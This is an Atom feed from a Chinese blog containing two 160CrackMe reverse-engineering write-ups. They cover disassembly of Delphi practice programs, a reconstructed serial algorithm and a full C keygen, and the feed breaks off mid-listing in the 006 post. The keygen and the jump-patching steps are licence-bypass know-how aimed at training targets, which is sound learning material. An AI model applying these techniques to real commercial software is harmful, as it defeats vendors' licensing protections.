<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ackie&#39;blog</title>
  
  
  <link href="https://b1ack1e.github.io/atom.xml" rel="self"/>
  
  <link href="https://b1ack1e.github.io/"/>
  <updated>2021-08-03T07:11:11.612Z</updated>
  <id>https://b1ack1e.github.io/</id>
  
  <author>
    <name>b1ackie</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>160CrackMe-007</title>
    <link href="https://b1ack1e.github.io/2021/08/03/160CrackMe-007/"/>
    <id>https://b1ack1e.github.io/2021/08/03/160CrackMe-007/</id>
    <published>2021-08-03T02:52:32.000Z</published>
    <updated>2021-08-03T07:11:11.612Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序还是和上一个有很熟悉的画面，不愧是同一个作者做的。</p><p><img src="/2021/08/03/160CrackMe-007/1.png"></p><p>about按钮了解情况，还是需要让按钮消失然后露出logo就算成功了。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>无壳，是使用delphi编写的。</p><p><img src="/2021/08/03/160CrackMe-007/2.png"></p><p>还是直接使用DeDark查看，然后去下断</p><p><img src="/2021/08/03/160CrackMe-007/3.png"></p><p>断下来之后进行分析，可以看到一个较为关键的跳转，在此之前的函数比较重要，进去查看一下。</p><p><img src="/2021/08/03/160CrackMe-007/4.png"></p><p>进来之后果然看到了算法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">004429EE  |.  8945 F4       mov dword ptr ss:[ebp-0xC],eax</span><br><span class="line">004429F1  |.  BE 01000000   mov esi,0x1</span><br><span class="line">004429F6  |&gt;  8B45 F8       /mov eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">004429F9  |.  E8 3610FCFF   |call aLoNg3x_.00403A34</span><br><span class="line">004429FE  |.  83F8 01       |cmp eax,0x1</span><br><span class="line">00442A01  |.  7C 1D         |jl short aLoNg3x_.00442A20</span><br><span class="line">00442A03  |&gt;  8B55 F8       |/mov edx,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442A06  |.  0FB65432 FF   ||movzx edx,byte ptr ds:[edx+esi-0x1]</span><br><span class="line">00442A0B  |.  8B4D F8       ||mov ecx,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442A0E  |.  0FB64C01 FF   ||movzx ecx,byte ptr ds:[ecx+eax-0x1]</span><br><span class="line">00442A13  |.  0FAFD1        ||imul edx,ecx</span><br><span class="line">00442A16  |.  0FAFD7        ||imul edx,edi</span><br><span class="line">00442A19  |.  03DA          ||add ebx,edx</span><br><span class="line">00442A1B  |.  48            ||dec eax</span><br><span class="line">00442A1C  |.  85C0          ||test eax,eax</span><br><span class="line">00442A1E  |.^ 75 E3         |\jnz short aLoNg3x_.00442A03</span><br><span class="line">00442A20  |&gt;  46            |inc esi</span><br><span class="line">00442A21  |.  FF4D F4       |dec dword ptr ss:[ebp-0xC]</span><br><span class="line">00442A24  |.^ 75 D0         \jnz short aLoNg3x_.004429F6</span><br><span class="line">00442A26  |&gt;  8BC3          mov eax,ebx</span><br><span class="line">00442A28  |.  99            cdq</span><br><span class="line">00442A29  |.  33C2          xor eax,edx</span><br><span class="line">00442A2B  |.  2BC2          sub eax,edx</span><br><span class="line">00442A2D  |.  B9 2A2C0A00   mov ecx,0xA2C2A</span><br><span class="line">00442A32  |.  99            cdq</span><br><span class="line">00442A33  |.  F7F9          idiv ecx</span><br><span class="line">00442A35  |.  8BDA          mov ebx,edx</span><br><span class="line">00442A37  |.  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442A3A  |.  B9 59000000   mov ecx,0x59</span><br><span class="line">00442A3F  |.  99            cdq</span><br><span class="line">00442A40  |.  F7F9          idiv ecx</span><br><span class="line">00442A42  |.  8BC8          mov ecx,eax</span><br><span class="line">00442A44  |.  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442A47  |.  BE 50000000   mov esi,0x50</span><br><span class="line">00442A4C  |.  99            cdq</span><br><span class="line">00442A4D  |.  F7FE          idiv esi</span><br><span class="line">00442A4F  |.  03CA          add ecx,edx</span><br><span class="line">00442A51  |.  41            inc ecx</span><br><span class="line">00442A52  |.  894D FC       mov dword ptr ss:[ebp-0x4],ecx</span><br><span class="line">00442A55  |.  3B5D FC       cmp ebx,dword ptr ss:[ebp-0x4]</span><br></pre></td></tr></table></figure><p>但是问题是，其中edi的值一直为0，这导致一直在计算的值都是0，然后再进行比较，是不可以的，必须要找到edi在何处被赋值。</p><p><img src="/2021/08/03/160CrackMe-007/5.png"></p><p>往上慢慢寻找一下，可以看到此处edi的值是通过eax赋值的，那么又要寻找eax的值，函数内部没有，需要出去函数寻找。</p><p><img src="/2021/08/03/160CrackMe-007/6.png"></p><p>出函数之后，看到eax的值是通过一个地址传递的</p><p><img src="/2021/08/03/160CrackMe-007/7.png"></p><p>继续找寻此地址的值是从何处得来，下硬件断点，没有断下来，说明不满足条件，不过在上面不远处就可以看到这个地址的赋值。看到如果想要进入此处需要让上面的JZ跳转不跳走，进入前面的函数看看</p><p><img src="/2021/08/03/160CrackMe-007/8.png"></p><p>进去发现是一个判断你输入的codice中是否含有非数字的一个判断，但是其中又有一点限制，就是第一位如果输入-，+，$，X，x，剩下都是数字的话，也是可以的，反正就是，输入非纯数字的codice以便可以进入后面，如果输入第一位为以上几个的话，那么其中还需要至少再含有一个非数字就可以。</p><p><img src="/2021/08/03/160CrackMe-007/9.png"></p><p>继续分析，再赋值前一条语句的函数就是关键的生成函数，进入分析，发现算法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00442ACD  |.  B9 01000000   mov ecx,0x1</span><br><span class="line">00442AD2  |&gt;  8B45 FC       /mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442AD5  |.  0FB60408      |movzx eax,byte ptr ds:[eax+ecx]</span><br><span class="line">00442AD9  |.  BF 11000000   |mov edi,0x11</span><br><span class="line">00442ADE  |.  33D2          |xor edx,edx</span><br><span class="line">00442AE0  |.  F7F7          |div edi</span><br><span class="line">00442AE2  |.  42            |inc edx</span><br><span class="line">00442AE3  |.  8B45 FC       |mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442AE6  |.  0FB64408 FF   |movzx eax,byte ptr ds:[eax+ecx-0x1]</span><br><span class="line">00442AEB  |.  0FAFD0        |imul edx,eax</span><br><span class="line">00442AEE  |.  03F2          |add esi,edx</span><br><span class="line">00442AF0  |.  41            |inc ecx                                 ;  user32.75B16D51</span><br><span class="line">00442AF1  |.  4B            |dec ebx</span><br><span class="line">00442AF2  |.^ 75 DE         \jnz short aLoNg3x_.00442AD2</span><br><span class="line">00442AF4  |.  EB 02         jmp short aLoNg3x_.00442AF8</span><br><span class="line">00442AF6  |&gt;  33F6          xor esi,esi</span><br><span class="line">00442AF8  |&gt;  8BC6          mov eax,esi</span><br><span class="line">00442AFA  |.  B9 48710000   mov ecx,0x7148</span><br><span class="line">00442AFF  |.  99            cdq</span><br><span class="line">00442B00  |.  F7F9          idiv ecx                                 ;  user32.75B16D51</span><br><span class="line">00442B02  |.  8BC2          mov eax,edx</span><br><span class="line">00442B04  |.  99            cdq</span><br><span class="line">00442B05  |.  33C2          xor eax,edx                              ;  XOR0</span><br><span class="line">00442B07  |.  2BC2          sub eax,edx                              ;  -0</span><br><span class="line">00442B09  |.  8BD8          mov ebx,eax</span><br><span class="line">00442B0B  |.  33C0          xor eax,eax</span><br></pre></td></tr></table></figure><p>这里会生成一个标志值，用于后面的计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(szCodice);</span><br><span class="line"><span class="keyword">int</span> remainder;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0x37B</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len ; i++) &#123;</span><br><span class="line">remainder = szCodice[i] % <span class="number">0x11</span> + <span class="number">1</span>;</span><br><span class="line">sum += remainder * szCodice[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">sum = sum % <span class="number">0x7148</span>;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br></pre></td></tr></table></figure><p>生成标志值之后就可以继续刚才的算法计算了，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(szName);</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= len; j++) &#123;</span><br><span class="line">sum += (szName[i] * szName[len - j]) * FlagNumber;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">__asm &#123;</span><br><span class="line">mov eax,sum</span><br><span class="line">cdq</span><br><span class="line"><span class="keyword">xor</span> eax,edx</span><br><span class="line">sub eax,edx</span><br><span class="line">mov ecx,<span class="number">0xA2C2A</span></span><br><span class="line">cdq</span><br><span class="line">idiv ecx</span><br><span class="line">mov ebx,edx</span><br><span class="line">mov sum,ebx</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> serial;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">0xFFFFFFFF</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (((i / <span class="number">0x59</span>) + (i % <span class="number">0x50</span>) + <span class="number">1</span>) == sum) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;codice:%d\n&quot;</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里算出了一个可以用的codice</p><p><img src="/2021/08/03/160CrackMe-007/11.png"></p><p>输入后发现又出现了一个again按钮。</p><p><img src="/2021/08/03/160CrackMe-007/10.png"></p><p>从dedark中找到againClick事件，经过分析发现其实是和OK按钮一模一样的流程，也就是把刚才输入的在输入一次就好了</p><p><img src="/2021/08/03/160CrackMe-007/12.png"></p><h4 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h4><p>完整注册机如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//字母</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getFlagNumber</span><span class="params">(<span class="keyword">char</span>* szCodice)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(szCodice);</span><br><span class="line"><span class="keyword">int</span> remainder;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0x37B</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len ; i++) &#123;</span><br><span class="line">remainder = szCodice[i] % <span class="number">0x11</span> + <span class="number">1</span>;</span><br><span class="line">sum += remainder * szCodice[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">sum = sum % <span class="number">0x7148</span>;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OkClick</span><span class="params">(<span class="keyword">char</span>* szName,<span class="keyword">int</span> FlagNumber)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(szName);</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= len; j++) &#123;</span><br><span class="line">sum += (szName[i] * szName[len - j]) * FlagNumber;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">__asm &#123;</span><br><span class="line">mov eax,sum</span><br><span class="line">cdq</span><br><span class="line"><span class="keyword">xor</span> eax,edx</span><br><span class="line">sub eax,edx</span><br><span class="line">mov ecx,<span class="number">0xA2C2A</span></span><br><span class="line">cdq</span><br><span class="line">idiv ecx</span><br><span class="line">mov ebx,edx</span><br><span class="line">mov sum,ebx</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> serial;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">0xFFFFFFFF</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (((i / <span class="number">0x59</span>) + (i % <span class="number">0x50</span>) + <span class="number">1</span>) == sum) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;codice:%d\n&quot;</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请先输入第一位是字母的Codice以便生成标志值\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> Codice[<span class="number">20</span>];</span><br><span class="line">gets_s(Codice, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">int</span> FlagNumber = getFlagNumber(Codice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入用户名\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">gets_s(name, <span class="number">20</span>);</span><br><span class="line">OkClick(name, FlagNumber);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个程序就是需要先输入非纯数字codice生成一个标志值计算，然后再输入codice就可以了，连续两次即可。注册机那段内联汇编，实在不知道怎么用C写了…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序还是和上一个有很熟悉的画面，不愧是同一个作者做的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/03/160CrackMe-</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-006</title>
    <link href="https://b1ack1e.github.io/2021/08/02/160CrackMe-006/"/>
    <id>https://b1ack1e.github.io/2021/08/02/160CrackMe-006/</id>
    <published>2021-08-02T10:19:24.000Z</published>
    <updated>2021-08-02T11:19:49.350Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序如下看到OK是不可点击的，是一个灰色按钮。</p><p><img src="/2021/08/02/160CrackMe-006/1.png"></p><p>点击about查看一下，可以看到我们需要让两个按钮都消失以便可以看到Ringzer0的logo</p><p><img src="/2021/08/02/160CrackMe-006/2.png"></p><p>那么先想办法让OK变得可以点击吧。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查看壳，发现未加壳，是用Delphi写的</p><p><img src="/2021/08/02/160CrackMe-006/3.png"></p><p>使用API断点，给IsEnableWindow下断，但是发现怎么都无法断下来，说明肯定是有条件的，而当前还没有满足这个条件。</p><p>使用dedark工具帮忙查看，直接分析真的是太难找了，可以看到主要四个事件，这四个事件应该比较关键</p><p><img src="/2021/08/02/160CrackMe-006/4.png"></p><p>根据函数地址找到函数下好断点之后，查看可以发现nomechange和codicechange几乎是一样的，将两处明显的跳转更改条件使跳转失效，让程序跑起来后都会断在之前下的API断点上。那么它们都是比较关键的地方。</p><p>第一个关键跳转都是判断eax+0x47这个地址的值是否等于0，而第二个跳转都是先调用了00442A3C这个函数。</p><p>nomechange：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">00442E04  /.  55            push ebp                                 ;  nomeChange</span><br><span class="line">00442E05  |.  8BEC          mov ebp,esp</span><br><span class="line">00442E07  |.  6A 00         push 0x0</span><br><span class="line">00442E09  |.  6A 00         push 0x0</span><br><span class="line">00442E0B  |.  53            push ebx</span><br><span class="line">00442E0C  |.  8BD8          mov ebx,eax</span><br><span class="line">00442E0E  |.  33C0          xor eax,eax</span><br><span class="line">00442E10  |.  55            push ebp</span><br><span class="line">00442E11  |.  68 9B2E4400   push aLoNg3x_.00442E9B</span><br><span class="line">00442E16  |.  64:FF30       push dword ptr fs:[eax]</span><br><span class="line">00442E19  |.  64:8920       mov dword ptr fs:[eax],esp</span><br><span class="line">00442E1C  |.  8B83 D0020000 mov eax,dword ptr ds:[ebx+0x2D0]</span><br><span class="line">00442E22  |.  8078 47 00    cmp byte ptr ds:[eax+0x47],0x0</span><br><span class="line">00442E26  |.  75 0F         jnz short aLoNg3x_.00442E37              ;  关键跳转1</span><br><span class="line">00442E28  |.  B2 01         mov dl,0x1</span><br><span class="line">00442E2A  |.  8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]</span><br><span class="line">00442E30  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  aLoNg3x_.0044282C</span><br><span class="line">00442E32  |.  FF51 60       call dword ptr ds:[ecx+0x60]             ;  IsEnableWindow</span><br><span class="line">00442E35  |.  EB 49         jmp short aLoNg3x_.00442E80</span><br><span class="line">00442E37  |&gt;  8D55 FC       lea edx,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442E3A  |.  8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]</span><br><span class="line">00442E40  |.  E8 7B04FEFF   call aLoNg3x_.004232C0</span><br><span class="line">00442E45  |.  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]           ;  user32.75B17276</span><br><span class="line">00442E48  |.  50            push eax</span><br><span class="line">00442E49  |.  8D55 F8       lea edx,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442E4C  |.  8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC]         ;  comctl_1.74646957</span><br><span class="line">00442E52  |.  E8 6904FEFF   call aLoNg3x_.004232C0</span><br><span class="line">00442E57  |.  8B45 F8       mov eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442E5A  |.  5A            pop edx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442E5B  |.  E8 DCFBFFFF   call aLoNg3x_.00442A3C</span><br><span class="line">00442E60  |.  84C0          test al,al</span><br><span class="line">00442E62  |.  74 0F         je short aLoNg3x_.00442E73               ;  关键跳转2</span><br><span class="line">00442E64  |.  B2 01         mov dl,0x1</span><br><span class="line">00442E66  |.  8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]</span><br><span class="line">00442E6C  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  aLoNg3x_.0044282C</span><br><span class="line">00442E6E  |.  FF51 60       call dword ptr ds:[ecx+0x60]             ;  IsEnableWindow</span><br><span class="line">00442E71  |.  EB 0D         jmp short aLoNg3x_.00442E80</span><br><span class="line">00442E73  |&gt;  33D2          xor edx,edx</span><br><span class="line">00442E75  |.  8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]</span><br><span class="line">00442E7B  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  aLoNg3x_.0044282C</span><br><span class="line">00442E7D  |.  FF51 60       call dword ptr ds:[ecx+0x60]</span><br><span class="line">00442E80  |&gt;  33C0          xor eax,eax</span><br><span class="line">00442E82  |.  5A            pop edx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442E83  |.  59            pop ecx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442E84  |.  59            pop ecx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442E85  |.  64:8910       mov dword ptr fs:[eax],edx</span><br><span class="line">00442E88  |.  68 A22E4400   push aLoNg3x_.00442EA2</span><br><span class="line">00442E8D  |&gt;  8D45 F8       lea eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442E90  |.  BA 02000000   mov edx,0x2</span><br><span class="line">00442E95  |.  E8 4209FCFF   call aLoNg3x_.004037DC</span><br><span class="line">00442E9A  \.  C3            retn</span><br><span class="line">00442E9B   .^ E9 D803FCFF   jmp aLoNg3x_.00403278</span><br><span class="line">00442EA0   .^ EB EB         jmp short aLoNg3x_.00442E8D</span><br><span class="line">00442EA2   .  5B            pop ebx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442EA3   .  59            pop ecx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442EA4   .  59            pop ecx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442EA5   .  5D            pop ebp                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442EA6   .  C3            retn</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>codicechange：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">00442C78  /.  55            push ebp                                 ;  codiceChange</span><br><span class="line">00442C79  |.  8BEC          mov ebp,esp</span><br><span class="line">00442C7B  |.  33C9          xor ecx,ecx</span><br><span class="line">00442C7D  |.  51            push ecx</span><br><span class="line">00442C7E  |.  51            push ecx</span><br><span class="line">00442C7F  |.  51            push ecx</span><br><span class="line">00442C80  |.  51            push ecx</span><br><span class="line">00442C81  |.  53            push ebx</span><br><span class="line">00442C82  |.  56            push esi</span><br><span class="line">00442C83  |.  8BD8          mov ebx,eax</span><br><span class="line">00442C85  |.  33C0          xor eax,eax</span><br><span class="line">00442C87  |.  55            push ebp</span><br><span class="line">00442C88  |.  68 562D4400   push aLoNg3x_.00442D56</span><br><span class="line">00442C8D  |.  64:FF30       push dword ptr fs:[eax]</span><br><span class="line">00442C90  |.  64:8920       mov dword ptr fs:[eax],esp</span><br><span class="line">00442C93  |.  8D55 F8       lea edx,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442C96  |.  8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]</span><br><span class="line">00442C9C  |.  E8 1F06FEFF   call aLoNg3x_.004232C0</span><br><span class="line">00442CA1  |.  8B45 F8       mov eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442CA4  |.  8D55 FC       lea edx,dword ptr 